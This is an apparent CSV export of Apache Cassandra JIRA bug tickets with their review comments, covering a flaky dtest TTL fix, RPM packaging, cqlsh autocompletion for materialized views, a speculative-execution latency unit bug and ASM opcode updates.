 ",,adelapena,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17605,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Sep 12 16:07:31 UTC 2022,,,,,,,All,,,,"0|z18g68:",9223372036854775807,,,,adelapena,brandon.williams,,,Normal,,,,https://github.com/apache/cassandra-dtest/commit/945408941e5ce6634751b23995c147078ad05576,,,,,,,,,"I looped the test locally a few times with no issues. The test failure was not reproducible in CircleCI even before the patch so rerunning the repeatable runs didn't make sense to me. 

[dtest patch|https://github.com/ekaterinadimitrova2/cassandra-dtest/commits/17882]",,,,,"09/Sep/22 15:39;e.dimitrova;Looking into the test it seems to me nothing more than a timing issue. 

If we reduce the TTL to 5 seconds we can reproduce the failure so I suggest we just raise the TTL from 20 to 30 to prevent flakiness.

I didn't run repeatedly the test with the increased TTL in CircleCI as it was not failing there even with the old value.

4.1 - [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1889/workflows/81d755c5-da11-4da6-bc3e-ddb5a63ca239/jobs/14890] and [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1889/workflows/16d2e175-251d-45dd-b559-09e18b66f10c/jobs/14894] 1000 runs on clean 4.1 without the patch

4.0 - [1000 runs |https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=clean-4.0] running each repeatable job on clean 4.0

I actually decided to increase also the next UPDATE statement TTL to 30 too, just in case so we don't have to revise the test again in two days. 

I looped the test locally a few times with no issues. 

[dtest patch|https://github.com/ekaterinadimitrova2/cassandra-dtest/commits/17882]

[~brandon.williams] , [~adelapena] anyone of you up for review? :) ;;;","09/Sep/22 15:42;brandon.williams;The comment you edited was already out of date, so this probably isn't the first time this has been bumped and it makes sense to do so again. +1;;;","09/Sep/22 15:45;e.dimitrova;Yes, CASSANDRA-14148. ...which reminds me I need to edit also the previous comment, I will do it on commit :) Thanks ;;;","09/Sep/22 16:27;adelapena;I'd say that the sleeps that are right after the modified lines ([here|https://github.com/ekaterinadimitrova2/cassandra-dtest/blob/364081c7fe40daf32ccd2818cd7ecdf7e79e0db2/materialized_views_test.py#L1544] and [here|https://github.com/ekaterinadimitrova2/cassandra-dtest/blob/364081c7fe40daf32ccd2818cd7ecdf7e79e0db2/materialized_views_test.py#L1551]) where meant to let the TTL'ed columns expire before proceeding with the next check. If that's right, increasing the ttls without increasing the sleep would change the meaning of the test, I think.;;;","09/Sep/22 17:10;e.dimitrova;That's a very good point, thank you for catching it! So I guess it should be enough to make them equal to the TTLs, right? Like in this [commit|https://github.com/ekaterinadimitrova2/cassandra-dtest/commit/827d869ad8eb88bc7594cb0c6c7ef7db4d310485]

I just checked that was actually also done with the previous bump and it makes total sense to me. Good catch!;;;","09/Sep/22 18:07;adelapena;Yes, exactly like that (y)

I'd give it another quick run in the the multiplexer, just in case.

If the long sleeps were a problem for timeouts, I guess we could make {{update_view}} return the time when the query has been executed:
{code:python}
def update_view(self, session, query, flush, compact=False):
    session.execute(query)
    query_time = time.time() # new

    self._replay_batchlogs()
    if flush:
        self.cluster.flush()
    if compact:
        self.cluster.compact()

    return query_time  # new {code}
And then use that time to do a shorter sleep:
{code:python}
update_time = self.update_view(session, ""UPDATE t USING TTL 30 SET a=1 WHERE k=1 AND c=1;"", flush)
assert_one(session, ""SELECT * FROM t"", [1, 1, 1, None, None, None])
assert_one(session, ""SELECT * FROM mv"", [1, 1, 1, None])

wait_time = update_time + 30 - time.time()
if wait_time > 0:
    time.sleep(wait_time)
{code}
But only if the long wait is a problem, I don't know if that is the case.;;;","09/Sep/22 18:16;e.dimitrova;Another good idea :) I will do some testing. It seems that _update_view_ is used 48 times in _materialized_views_test_ so maybe the whole suite can benefit of this. I will test later today, thanks!;;;","09/Sep/22 21:39;e.dimitrova;While looking into this I saw that for some tests we were adding also additional try-catch block and error message to ask people to raise the TTL. (added initially for CASSANDRA-17605)

Even if the long sleeps weren't many and becoming an issue so far I figured that it is better to take the precaution so we don't have to revise this suite again soon for timeouts. 

For consistency and because this is a good idea, I added it here too. 

I also checked the other places where we use update_time with TTL and similar sleeps, there was only one sleep of 5 seconds and I figured that it is a too small one to deal with it. I ended up updating only the test in question. The additional changes are added in [this|https://github.com/ekaterinadimitrova2/cassandra-dtest/commit/625e342f44de1097f007da07b7c92166bcdff205] commit. I will post Circle CI runs soon.

 ;;;","09/Sep/22 22:21;e.dimitrova;Just started the following runs, I will check them back later:
||Branch||CI runs||
|3.0|[j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1891/workflows/27b79d20-8623-48ad-976c-64dfa7197e3e]|
|3.11|[j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1892/workflows/770c85ea-a7c7-4220-93ba-30e667e2866e]|
|4.0|[j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1893/workflows/e2cccd5e-02ac-492a-8b71-5ebbbef548ef] [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1893/workflows/5a51784e-8fda-40a9-99eb-d0d97fb1ae83]|
|4.1|[j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1894/workflows/055cf6f9-14ec-4537-a8fc-36f9d57458f6] [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1894/workflows/89a88c5e-2217-4058-a238-aa19c281906c]|
|trunk|[j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1895/workflows/8114bce5-387c-47c9-8292-f89f184c3d35] [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1895/workflows/a1c20624-326e-4034-a2da-237b68b04c1e]|

 ;;;","12/Sep/22 09:24;adelapena;Looks great, +1;;;","12/Sep/22 14:27;e.dimitrova;All green, thanks, I assume [~brandon.williams] approval still stands, starting commit soon :) ;;;","12/Sep/22 14:38;brandon.williams;+1 I do :);;;","12/Sep/22 16:07;e.dimitrova;Thanks, committed:

https://github.com/apache/cassandra-dtest.git

   47f33636..94540894  trunk -> trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
RPM noboolean packages deployed in place of others,CASSANDRA-17880,13480691,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,mck,brandon.williams,brandon.williams,08/Sep/22 15:32,05/Oct/22 22:22,13/Jul/23 08:40,27/Sep/22 13:10,4.0.7,4.1,4.1-beta1,5.0,,,Packaging,,,,0,,"In CASSANDRA-17765 we created the 'noboolean' packages for distros unable to understand boolean dependency logic, but it appears these are the only packages deployed for download - once as noboolean packages, and once as standard packages.",,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17765,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,mck,,,,,,,,,,,,,,Packaging -> All,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Sep 27 13:10:06 UTC 2022,,,,,,,All,,,,"0|z18ez4:",9223372036854775807,,,,brandon.williams,mck,,,Normal,,4.0.6,,https://github.com/apache/cassandra-builds/commit/c07e4728a1f21b77f9a4fcdf255c434ec6716aaa,,,,,,,,,tested with the cut of 4.1-beta1,,,,,"12/Sep/22 22:02;brandon.williams;I have confirmed from svn that both sets of packages are the same:

{code}
ff8818e91694cdb1b04d5b8379c0f942  cassandra-4.0.6-1.noarch.rpm
ff8818e91694cdb1b04d5b8379c0f942  noboolean/cassandra-4.0.6-1.noarch.rpm
{code}

which leads to believe the problem lies somewhere in prepare_release.sh.;;;","12/Sep/22 22:37;mck;https://github.com/apache/cassandra-builds/blob/trunk/cassandra-release/prepare_release.sh#L357-L362
The noboolean $rpm_dir gets copied into both places.

Fix in https://github.com/apache/cassandra-builds/compare/trunk...thelastpickle:cassandra-builds:mck/17880-copy-rpm-noboolean-separate-when-cutting-release ;;;","12/Sep/22 22:49;brandon.williams;LGTM +1;;;","27/Sep/22 13:06;brandon.williams;Verified the deployment of the 4.1 test artifacts, everything is correct.;;;","27/Sep/22 13:10;mck;Committed as [c07e4728a1f21b77f9a4fcdf255c434ec6716aaa|https://github.com/apache/cassandra-builds/commit/c07e4728a1f21b77f9a4fcdf255c434ec6716aaa].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"It is not possible to autocomplete ""WITH"" when creating materialized view",CASSANDRA-17879,13480498,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bschoeni,smiklosovic,smiklosovic,07/Sep/22 14:42,06/Oct/22 17:38,13/Jul/23 08:40,04/Oct/22 19:22,3.0.28,3.11.14,4.0.7,4.1,4.1-rc1,5.0,CQL/Interpreter,,,,0,,"I noticed that when I type this:

{code}
CREATE MATERIALIZED VIEW ks.mv2 AS SELECT * FROM t WHERE k IS NOT NULL AND c1 IS NOT NULL AND c2 IS NOT NULL PRIMARY KEY (c1,k,c2) <TAB>
{code}

nothing happens after pressing tab, there should be options shown as for table case.",,bschoeni,e.dimitrova,smiklosovic,,,,,,,,,,,,"bschoening closed pull request #1874: CASSANDRA-17879 added with table options to createMaterializedView
URL: https://github.com/apache/cassandra/pull/1874


;27/Sep/22 23:54;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16640,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bschoeni,,,,,,,,,,,,,,Correctness -> API / Semantic Implementation,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Oct 04 14:46:37 UTC 2022,,,,,,,All,,,,"0|z18dt4:",9223372036854775807,,,,brandon.williams,smiklosovic,,,Low,,3.0.0,,https://github.com/apache/cassandra/commit/83c1f7713bf24ec4873cfa9f76f2efccc8a23278,,,,,,,,,"1. updated and ran the unit test:

pytest test_cqlsh_completion.py -k test_complete_in_create_materializedview

2. validated with live CQLSH session also",,,,,"08/Sep/22 15:17;smiklosovic;Hi [~bschoeni], do you think this is something you could look at, given your expertize in cqlsh / python lately? Thanks.;;;","09/Sep/22 19:57;bschoeni;[~smiklosovic]  I'll take a look at the parser to see if there is an obvious fix.  But materialized views are experimental and it appears may be obsoleted by [SAI indexes|https://cwiki.apache.org/confluence/display/CASSANDRA/CEP-7] when they are released.  So, this may be a low priority issue.

Are there any other examples, does it work correctly with secondary indexes?

 ;;;","21/Sep/22 01:02;bschoeni;In cql3handling.py, it uses this completer_for syntax with and without a decorator, for example:
{code:java}
@completer_for('createColumnFamilyStatement', 'wat')
def create_cf_wat_completer(ctxt, cass):
    # would prefer to get rid of the ""columnfamily"" nomenclature in cql3
    if ctxt.get_binding('partial', '') == '':
        return ['TABLE']
    return ['TABLE', 'COLUMNFAMILY']
{code}
{code:java}
@completer_for('createColumnFamilyStatement', 'dot')
def create_cf_ks_dot_completer(ctxt, cass):
    ks = dequote_name(ctxt.get_binding('ks'))
    if ks in cass.get_keyspace_names():
        return ['.']
    return []
{code}
{code:java}
completer_for('columnFamilyName', 'ksname')(cf_ks_name_completer)
completer_for('materializedViewName', 'ksname')(cf_ks_name_completer)
{code}
but there doesn't appear to be one for createMaterializedView:
{code:java}
% grep completer_for cql3handling.py | grep create
@completer_for('createKeyspaceStatement', 'wat')
@completer_for('createColumnFamilyStatement', 'wat')
@completer_for('createColumnFamilyStatement', 'dot')
@completer_for('createIndexStatement', 'col')
{code}
It seems there is some cleanup and refactoring needed here to remove the obsolete columnfamily nomenclature before replicating this for createMaterializedView.  I'm not really following the logic in the code here.

 

 ;;;","21/Sep/22 13:51;smiklosovic;I am not sure about the ""column family"" removal. First we should try to add it there without any changes. Then we can contemplate about the removal in the other ticket. However, to re-iterate once again, I do not think we are going to remove anything here, mostly for backward compatibility reasons. 

Could you please also check since where this issue is in? I think that materialized views were added around times of 3.6 or 3.8, not sure at all tbh.;;;","23/Sep/22 00:28;bschoeni;[~smiklosovic] see the linked PR and let me know how that works for you.  ;;;","23/Sep/22 07:59;smiklosovic;Hi [~brandon.williams], just double checking if this makes sense to fix so we are not working on something which wont make it to upstream. Is this a bug it was not added or there is some hidden logic here? As if people were discouraged from doing ""with ... "" by not providing it on purpose.;;;","23/Sep/22 10:24;brandon.williams;It's a bug imo.;;;","23/Sep/22 10:34;smiklosovic;[~bschoeni] materialized views are here from 3.0 included. I think we need to fix this for 3.0, 3.11, 4.0, 4.11 and trunk. Are you able to prepare all 5 branches?

We should also add a test for completion. I am not completely sure what tests we have for that domain but if there are some for normal tables, we should just add some for mv's as well.

Please let me know if you are fine with doing this otherwise I try to take your patch and apply it myself, however, providing a test would be awesome for sure.;;;","23/Sep/22 20:24;bschoeni;I'd assumed that user interaction with autocompletion would be hard to test, but I see its in test_cqlsh_completion.py.;;;","28/Sep/22 02:33;bschoeni;[~smiklosovic] this required a bit more thought than it seemed at first. If you get the BNF syntax a little off, it just stops autocompleting. 

This was definitely a bug as the <selectStatement> production rules were copied from the select statement syntax and not syntactically correct for creating materialized view.  E.g. you can't specify 'distinct' or 'as' aliases with a materialized view.

Also, I found that unit tests are missing for six other CQLSH commands, including 'create index' as reported in CASSANDRA-16640.;;;","28/Sep/22 05:39;smiklosovic;Thanks [~bschoeni] for the patch.

I tried it and the issues I ran into were:

1) it stopped to work when the primary key was composite, if primary key was just a simple column, ""(mycolumn)"", it autocompleted ""WITH"". But as soon as the key was ""((col1), col2)"" and I wanted to autocomplete ""WITH CLUSTERING ORDER BY (col2 DESC);"" it did not offer ""WITH"".

2) I was expecting that it will offer me all properties which I can use for regular tables. For example, ""WITH comment = 'this is my view'"" or any other property for that matter. 

For 2), this is where I am not completely sure if we are doing the right thing. Are mv allowed to go wild with other properties? Like you can have one gc_grace_seconds for base table but other for a mv? What does that mean in practice? Or compression, compaction and so on ... that's why I asked [~brandon.williams] if this makes sense to add into mv too. ;;;","28/Sep/22 11:06;brandon.williams;bq. Like you can have one gc_grace_seconds for base table but other for a mv?

There are some clues [here|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/cql3/statements/schema/CreateViewStatement.java#L112].  Mostly the answer is 'no.';;;","28/Sep/22 12:16;smiklosovic;Thanks. I see that it fails on gc_grace_seconds != 0 and default_time_to_live != 0. All other properties should be fine to set.

If it is possible, we might offer WITH ... with all the options but these two so users will not have it autocompleted and if they are super eager to do that, it would eventually fail anyway.;;;","29/Sep/22 00:51;bschoeni;[~smiklosovic]:

1) I've updated PR to support composite partition keys and have added unit tests for that.

2) Also corrected the completer logic for WITH options.

According to the code [~brandon.williams] links to, only a TTL can't be set in a MV.;;;","29/Sep/22 06:40;smiklosovic;Great stuff.

gc_grace_seconds should not be allowed to be set either (mentioned in my last comment).

I added it there, it is currently building in circle. I ll let you know.

btw this needs to be applied from 3.0 included, would you mind to prepare all branches?;;;","29/Sep/22 17:49;smiklosovic;FYI CI on trunk passed just fine.;;;","29/Sep/22 19:37;bschoeni;I meant to say, I'm not really familiar with creating it for the branches. ;;;","29/Sep/22 20:14;smiklosovic;Right ... there is a nice doco about that here [https://cassandra.apache.org/_/development/how_to_commit.html]

Basically, what you ideally do is that you fix it in cassandra-3.0, then you merge it up to cassandra-3.11 and resolve conflicts if any, then you merge up to 4.0, 4.1 and finally trunk, as it is shown in docs.

If you are really not up to it, let me know and I ll do that but it would be nice to have a patch for cassandra-3.0 so I will try to merge it up to trunk on my own.;;;","03/Oct/22 08:40;smiklosovic;I am taking care of that. The patch is same for 3.0 as well, fortunately. I ll build all branches and let you know.;;;","04/Oct/22 01:08;bschoeni;[~smiklosovic] thanks, I took a look at the link, but it wasn't immediately clear.  I'll take a more in depth look at it soon and cherry picking.;;;","04/Oct/22 06:50;smiklosovic;branches 

3.0 [https://github.com/instaclustr/cassandra/tree/cassandra-3.0]
3.11 [https://github.com/instaclustr/cassandra/tree/cassandra-3.11]
4.0 [https://github.com/instaclustr/cassandra/tree/cassandra-4.0]
4.1[https://github.com/instaclustr/cassandra/tree/cassandra-4.1]
trunk [https://github.com/instaclustr/cassandra/tree/trunk]

builds

3.0 [https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1965/]
3.11 [https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1966/]
4.0 [https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1967/]
4.1 [https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1969/]
trunk [https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1971/];;;","04/Oct/22 06:51;smiklosovic;[~brandon.williams] would you mind to take a look, please?;;;","04/Oct/22 14:46;brandon.williams;+1, no failures are related.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Speculative execution threshold unit mismatch,CASSANDRA-17877,13479902,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jonmeredith,jonmeredith,jonmeredith,02/Sep/22 14:49,07/Mar/23 10:38,13/Jul/23 08:40,06/Sep/22 16:10,4.1-beta1,5.0,,,,,Consistency/Coordination,,,,0,,"CASSANDRA-16760 changed the ColumnFamilyStore.coordinatorRead/WriteLatency to be in microseconds rather than nanoseconds but did not change the calculation for ColumnFamilyStore.sampleReadLatencyNanos/additionalWriteLatency which is used as the threshold for speculative read execution / issuing additional writes.

The impact of this bug is that the threshold is 1000x smaller than intended when using percentile based speculation (tables default to 99p), so effectively speculation happens for ALL reads configured to speculate on a percentile, including min hybrid policies that use percentiles.
",,brandon.williams,e.dimitrova,jonmeredith,maedhroz,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jonmeredith,,,,,,,,,,,,,,Degradation -> Resource Management,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Sep 02 17:00:23 UTC 2022,,,,,,,All,,,,"0|z18a6g:",9223372036854775807,,,,maedhroz,ycai,yifanc,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/6748b8b7ead6fff7820045ebbfe23f6c050f2efe,,,,,,,,,"Run existing tests, added an updated check for the speculation thresholds being in the expected range.",,,,,"02/Sep/22 17:00;jonmeredith;[4.1|https://github.com/jonmeredith/cassandra/tree/C17877-4.1] [PR|https://github.com/apache/cassandra/pull/1840]

[trunk|https://github.com/jonmeredith/cassandra/tree/C17877-trunk] [PR|https://github.com/apache/cassandra/pull/1841]

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.1|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17877-cassandra-4.1-7F4A7ACF-1BF2-4CEC-8C0C-D015909744AE]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17877-cassandra-4.1-7F4A7ACF-1BF2-4CEC-8C0C-D015909744AE]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1906/]|
|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17877-trunk-7F4A7ACF-1BF2-4CEC-8C0C-D015909744AE]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17877-trunk-7F4A7ACF-1BF2-4CEC-8C0C-D015909744AE]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1907/]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Opcodes.ASM7 should be used in UDFByteCodeVerifier to support JDK11,CASSANDRA-17873,13479553,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,31/Aug/22 20:29,23/Nov/22 15:09,13/Jul/23 08:40,20/Oct/22 18:22,4.0.8,4.1,4.1-rc1,5.0,,,Build,Dependencies,Feature/UDF,,0,,"In CASSANDRA-15108 ASM was updated and UDFByteCodeVerifier was updated to provide Opcodes.ASM7 but only in 1 of 3 places. 

We need to update that for 4.0, 4.1 and trunk where we support JDK11.

Also, I think it will be good to add one place where we update that when we add new JDK support as now I see we will have to update it at 4 places at least already (also for the simulator where currently it is Opcodes.ASM7 there, correctly added). Also, we can add a note in build.xml for people updating ASM. I think many people practice updating Opcodes.ASM* with the update of ASM version but in our case with update of JDK, from what I see. We will need to switch to ASM9 when we add the JDK 17 support. One stop place for that and adding a note for maintainers sounds like the right way to move forward at least on trunk. 

But for 4.0 and 4.1 we need at least to switch to ASM7 everywhere as far as I can tell.",,bdeggleston,benedict,bereng,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-15108,,,,,,CASSANDRA-17971,,,,,,,,,,,,,,,,CASSANDRA-17975,CASSANDRA-17980,,,,,,,,,0.0,,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Oct 21 05:00:42 UTC 2022,,,,,,,All,,,,"0|z18820:",9223372036854775807,,,,benedict,bereng,,,Normal,,4.0,,https://github.com/apache/cassandra/commit/ce1584ccc8ff65dc7e600f13f31b553732a1f12e,,,,,,,,,"||Branch||CI run||
|[4.0|https://github.com/ekaterinadimitrova2/cassandra/tree/17873-4.0]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-4.0]|
|[4.1|https://github.com/ekaterinadimitrova2/cassandra/tree/17873-4.1]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-4.1]|
|[trunk|https://github.com/ekaterinadimitrova2/cassandra/tree/17873-trunk]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-trunk] #1878 is the full CI run|

No new tests added 

All known flaky tests:

4.0:
 * testDropCompactStorage - CASSANDRA-17674

4.1:
 * test_multiple_repair - CASSANDRA-17005, known timeouts. Probably will reopen that ticket or open a new one but not related to this work
 * test_failed_bootstrap_wiped_node_can_join - CASSANDRA-17308

trunk: 
 * nodeDownDuringMove - CASSANDRA-15239, also in this case I suspect some Circle issue, I am spinning things in a loop to add more info to that ticket but I don't think this failure has anything to do with this particular work
 * test_failed_bootstrap_wiped_node_can_join - CASSANDRA-17308

 

*EDIT:* 

Latest pre-commit run:

4.0 [#1983|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-4.0]
 * [testMessageDeliveryOnReconnect|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1983/workflows/e4a63e37-c890-4cdb-8d52-7ad6e26e49b6/jobs/15843/tests#failed-test-0] - CASSANDRA-16677
 * [test_resume_stopped_build|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1983/workflows/2e4cf5a1-dd1e-4a45-bfa5-cb7a7d936b27/jobs/15828/tests#failed-test-0] - Not related. For completeness [this run|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=test-resume-stopped-build] shows it fails on current 4.0. I will open a new ticket 

4.1  [#1984|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-4.1] all green

trunk is green (please ignore the repeated test, the rest is green) [#1982|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-trunk]

To [https://github.com/apache/cassandra.git]

   a9df34c62a..ce1584ccc8  cassandra-4.0 -> cassandra-4.0

   f90148a344..1df5dd671e  cassandra-4.1 -> cassandra-4.1

   ac68f24512..6f709ca0ec  trunk -> trunk",,,,,"31/Aug/22 20:30;e.dimitrova;[~bdeggleston] , do you mind to confirm my reasoning that we need Opcodes.ASM7 in 4.0 and 4.1, please? As you were updating it last time for JDK11, I want to be sure I didn't miss anything. ;;;","01/Sep/22 17:19;bdeggleston;Seems reasonable yes, I can't think of a reason we'd want to keep it at the old value;;;","02/Sep/22 15:13;e.dimitrova; 
||Branch||CI run||
|[4.0|https://github.com/ekaterinadimitrova2/cassandra/tree/17873-4.0]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-4.0]|
|[4.1|https://github.com/ekaterinadimitrova2/cassandra/tree/17873-4.1]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-4.1]|
|[trunk|https://github.com/ekaterinadimitrova2/cassandra/tree/17873-trunk]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-trunk] #1878 is the full CI run|

 

All known flaky tests:

4.0:
 * testDropCompactStorage - CASSANDRA-17674

4.1:
 * test_multiple_repair - CASSANDRA-17005, known timeouts. Probably will reopen that ticket or open a new one but not related to this work
 * test_failed_bootstrap_wiped_node_can_join - CASSANDRA-17308

trunk: 
 * nodeDownDuringMove - CASSANDRA-15239, also in this case I suspect some Circle issue, I am spinning things in a loop to add more info to that ticket but I don't think this failure has anything to do with this particular work
 * test_failed_bootstrap_wiped_node_can_join - CASSANDRA-17308;;;","06/Sep/22 13:21;e.dimitrova;[~bdeggleston] , do you mind to review this one if you have a few minutes, please?;;;","18/Oct/22 13:25;bereng;I am not an expert here but the patches lgtm and if tests pass +1 from me bc that's all we can do. Failures seem flaky timeouts also.;;;","18/Oct/22 13:45;benedict;Are you sure JDK8 supports this bytecode version?;;;","18/Oct/22 14:06;e.dimitrova; 

[~benedict] , It's been some time since I dig that docs, I will look again whether I missed something by chance and post here for completeness.

On the other hand, looking now you use it with the simulator and run java 8 tests? I am no expert with the simulator but I assume if you run jdk8 tests and you use there already that opcode this was checked? I might be missing something though, so happy to be corrected.

PS ASM7 stands for the asm version and JDK11 official support was added in 7, experimental in 6, we had 5 here;;;","18/Oct/22 15:25;benedict;In that case it's fine, yes :) 

I don't have a mental map of ASM version to Java version unfortunately, just wanted to check it had been confirmed.;;;","18/Oct/22 17:05;e.dimitrova;{quote}I don't have a mental map of ASM version to Java version unfortunately, just wanted to check it had been confirmed.
{quote}
Same here and I looked into this like almost two months ago, appreciate you chiming in here! 

I am struggling to find official doc now on the opcodes and the Javadoc was not helpful but looking back into the Opcodes interface itself what I remembered is [ASM7 corresponds to minimum required ASM version|https://github.com/consulo/objectweb-asm/blob/master/asm/src/main/java/org/objectweb/asm/Opcodes.java#L44] which will support the jdk versions we need and 11 started official support in ASM7 as per the [changelog|https://asm.ow2.io/versions.html]. If we want to provide opcode  for particular JDK then we use the [V* opcodes|https://github.com/consulo/objectweb-asm/blob/master/asm/src/main/java/org/objectweb/asm/Opcodes.java#L268].  I hope I didn't somehow misunderstood this. Also, we will need to bump this further when we commit the JDK17 support bits, I keep a note on that myself. Which reminds me I might have to talk to you [~benedict]  about the jdk17 and the simulator so I do not miss anything there but I am not there yet. 
{quote}In that case it's fine, yes :)
{quote}
Thanks for confirming, I will add you both reviewers then :) I will rebase and rerun CI pre-commit as it has been a while.;;;","18/Oct/22 20:17;e.dimitrova;Pushed rebased all branches to CI:
||Branch||CI run||
|[4.0|https://github.com/ekaterinadimitrova2/cassandra/tree/17873-4.0]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17873-4.0] #1977 is the full CI run|
